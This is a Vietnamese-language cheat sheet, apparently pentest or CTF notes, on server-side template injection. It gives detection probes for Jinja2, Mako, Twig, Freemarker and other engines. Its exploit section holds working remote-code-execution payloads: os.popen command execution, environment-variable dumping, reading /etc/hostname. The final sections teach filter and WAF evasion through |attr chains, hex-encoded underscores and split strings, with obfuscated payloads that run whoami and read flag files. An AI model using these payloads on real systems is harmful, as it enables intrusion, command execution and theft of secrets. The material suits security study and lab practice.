#### Payloads
- Mẫu phổ quát để fuzz nhiều engine cùng lúc (gửi lần lượt):
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}           # Thymeleaf selection
{{ 7 | add:7 }}  # Liquid/Django-like filter
{% set x = 7*7 %}{{x}}
```
- Lỗi cú pháp có chủ đích (error-based): 
	- `{{ 7* }}      ${ {   <%= %>   [[! ]]`
- Một số engine auto-escape hoặc không có toán học:
```
{{ '7' ~ '7' }}        # Twig nối chuỗi
{{ 7|add:7 }}          # Django filter
{{ 7 | times: 7 }}     # Liquid
```

| Nền tảng | Engine              | Payload phát hiện (kỳ vọng 49 hoặc dấu hiệu)                          |
| -------- | ------------------- | --------------------------------------------------------------------- |
| Python   | **Jinja2**          | `{{7*7}}` → `49` ; `{{cycler.__mro__}}` báo lỗi/đối tượng             |
| Python   | **Django TPL**      | `{{7                                                                  |
| Python   | **Mako**            | `${7*7}` → `49`                                                       |
| Python   | **Tornado**         | `{{7*7}}` → `49`                                                      |
| PHP      | **Twig**            | `{{7*7}}` → `49` ; `{{_self}}` hiển thị template ref                  |
| PHP      | **Smarty**          | `{7*7}` → `49` ; `{$smarty.now}` hiển thị thời gian                   |
| PHP      | **Blade (Laravel)** | `{{ 7*7 }}` thường **escaped** (hiện `49`), nhưng logic khác với Twig |
| Ruby     | **ERB**             | `<%= 7*7 %>` → `49`                                                   |
| Ruby     | **Liquid**          | `{{ 7                                                                 |
| Java     | **Freemarker**      | `${7*7}` → `49` ; `${.main}`/`${.vars}` đôi khi leak                  |
| Java     | **Thymeleaf/SpEL**  | `${7*7}` hoặc `*{7*7}` → `49`                                         |
| Java     | **Velocity**        | `#set($x=7*7) $x` → `49`                                              |
| Node     | **Nunjucks**        | `{{7*7}}` → `49`                                                      |
| Node     | **EJS**             | `<%= 7*7 %>` → `49`                                                   |
| Node     | **Pug/Jade**        | `#{7*7}` → `49`                                                       |
| Go       | **html/template**   | Không có toán học trực tiếp; thử `{{.}}` hoặc cố tình lỗi để lộ stack |

<img width="715" height="452" alt="image" src="https://github.com/user-attachments/assets/c768a800-8c0b-4b2d-9182-30b93738edc8" />

#### Kỹ thuật nhận diện & thu hẹp engine
- **Ký tự bao**: `{{ }}`, `${ }`, `<%= %>`, `#{ }`, `{% %}` gợi ý cụ thể.
- **Lỗi**: thông điệp/stack trace tiết lộ tên package (`jinja2`, `freemarker`, `org.thymeleaf`, `erb`, `twig`).
- **Dấu escape**: `{{ … }}` hiển thị nguyên văn ⇒ có thể chỉ render text (escape bật) hoặc không dùng engine đó.
#### Exploit
###### Jinja2 (Python)
- `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
- thay id bằng các câu lệnh hệ thống khác (`ls, cat, ...`)
- `request` ở đây là object Flask Request.
- `.application` trỏ tới Flask app.
- `. __globals__` lấy **global variables** (biến toàn cục) của function/module hiện tại — về cơ bản là dictionary chứa các tham chiếu Python toàn cục.
- `.__builtins__` : Truy cập module built-in của Python (nơi chứa các hàm built-in như `print`, `len`, `__import__`, v.v.).
- `.__import__('os')`: 
	- Gọi trực tiếp built-in `__import__` để **import module `os`**.
	- Kỹ thuật này bỏ qua việc code chặn `import` trong template.
- `.popen('id')`: Dùng hàm `os.popen()` để chạy lệnh hệ thống (`id`) và mở một **pipe** để đọc kết quả.
- `.read()`
	- Đọc toàn bộ output từ pipe (kết quả của lệnh `id`).
	- Lệnh `id` sẽ in ra user, group, quyền hiện tại của process server.
###### Mako (Python)
- `${dir()}`: liệt kê tên biến trong scope hiện tại
- `${list(locals().keys())}`: các biến local mà Mako truyền vào
- `${list(globals().keys())}`: (tuỳ) biến global trong module template
- `${__import__('sys').version}` : phiên bản Python
- `${__import__('sys').executable}`: đường dẫn python
- `${__import__('sys').path}`: PYTHONPATH
- `${__import__('time').sleep(3) or 'OK'}`: phản hồi chậm rõ rệt → thực thi
- `${getattr(__import__('os'), 'getcwd')()}`: thư mục làm việc
- `${dict(__import__('os').environ).keys()}` : tên biến môi trường
- `${open('/etc/hostname').read()}`: file nhỏ, dễ hiển thị
- `${__import__("os").popen("ls").read()}`: chạy lệnh cmd
#### Key Bypass Techniques
##### 1. Avoiding Dot Notation (`.`) → Uses `|attr()` to dynamically access attributes:

request|attr(‘application’)|attr(“__globals__”)

— Bypasses WAFs blocking `request.application.__globals__`.

##### 2. Hex Encoding (`\x5f`) for Underscores (`_`)

    “\x5f\x5fglobals\x5f\x5f”

    — Bypasses filters blocking `__globals__`, `__builtins__`, and `__import__`.

##### 3. Using `__getitem__()` Instead of `[]`
    jinja2
    |attr(‘__getitem__’)(‘__builtins__’)

    — Evades protections blocking `__builtins__[‘__import__’]`.

##### 4. Jinja2 Sandbox Escape
— Accesses `request.application.__globals__` to get Python built-ins.
##### 5. RCE Without `eval()` or `exec()`

    __import__(‘os’).popen(‘id’).read()

    — Avoids blocked `os.system()` and `subprocess.Popen()`.
##### Adjacent string literals
- `__import__("o""s").system("l""s")`
##### Regular concatenation
- `__import__('o'+'s').system('l'+'s')`
##### payloads:

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('whoami')|attr('read')()}}
```
```
{{request|attr(‘application’)|attr(“\x5f\x5fglobals\x5f\x5f”)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(‘\x5f\x5fbuiltins\x5f\x5f’)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(“\x5f\x5fimport\x5f\x5f”)(‘os’)|attr(‘popen’)(‘cat flag’)|attr(‘read’)()}}
```

```
# payload này cho python rce vuln (code này được chạy trong hàm eval do lỗ hổng của web)
__import__('o'+'s').popen('c'+'a'+'t'+' '+'.'+'.'+chr(47)+'flag'+'.'+'txt').read()
```
